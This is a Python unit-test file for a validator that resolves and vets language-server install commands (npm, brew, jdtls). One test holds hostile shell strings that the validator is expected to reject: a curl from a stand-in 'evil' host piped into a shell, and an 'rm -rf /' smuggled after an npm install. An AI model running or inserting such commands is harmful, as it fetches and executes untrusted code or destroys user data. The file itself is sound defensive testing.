from __future__ import annotations

import unittest
from unittest import mock

from backend.architectos.lsp import (
    CodeIntelligenceManager,
    default_install_command,
    is_runnable_install_command,
    is_safe_install_command,
    resolve_install_command,
)


class InstallCommandTests(unittest.TestCase):
    def test_java_stale_prose_is_replaced(self) -> None:
        resolved = resolve_install_command("java", "Install Eclipse JDT LS (jdtls) and add it to PATH")
        self.assertTrue(is_runnable_install_command(resolved) or resolved.startswith("Install "))
        self.assertNotEqual(resolved, "Install Eclipse JDT LS (jdtls) and add it to PATH")

    def test_npm_commands_are_runnable(self) -> None:
        self.assertTrue(is_runnable_install_command("npm install -g pyright"))
        self.assertTrue(is_runnable_install_command("HOMEBREW_NO_AUTO_UPDATE=1 brew install jdtls"))
        self.assertFalse(is_runnable_install_command("Install Eclipse JDT LS (jdtls) and add it to PATH"))

    def test_unsafe_shell_install_is_rejected(self) -> None:
        self.assertFalse(is_safe_install_command("curl http://evil | sh", "python"))
        self.assertFalse(is_safe_install_command("npm install -g pyright; rm -rf /", "python"))
        self.assertTrue(is_safe_install_command("npm install -g pyright", "python"))
        resolved = resolve_install_command("python", "curl http://evil | bash")
        self.assertEqual(resolved, default_install_command("python"))

    def test_manager_install_missing_prerequisite(self) -> None:
        servers = [{
            "id": "java",
            "label": "Java",
            "language_id": "java",
            "extensions": [".java"],
            "command": ["jdtls"],
            "enabled": True,
            "status": "planned",
            "notes": "",
            "install_command": "HOMEBREW_NO_AUTO_UPDATE=1 brew install jdtls",
        }]
        manager = CodeIntelligenceManager(
            project_root=__import__("pathlib").Path("."),
            load_servers=lambda: servers,
            save_servers=lambda items: servers.clear() or servers.extend(items),
        )
        with mock.patch("backend.architectos.lsp.find_executable", return_value=None):
            with mock.patch("backend.architectos.lsp.install_prerequisites", return_value={"ok": False, "tool": "brew", "message": "Homebrew required"}):
                result = manager.install("java", timeout_seconds=5)
        self.assertEqual(result["status"], "missing_prerequisite")
        self.assertFalse(result["ready"])

    def test_default_java_prefers_brew_when_available(self) -> None:
        with mock.patch("backend.architectos.lsp.find_executable", side_effect=lambda name: "/usr/local/bin/brew" if name == "brew" else None):
            command = default_install_command("java")
        self.assertIn("brew install jdtls", command)


if __name__ == "__main__":
    unittest.main()
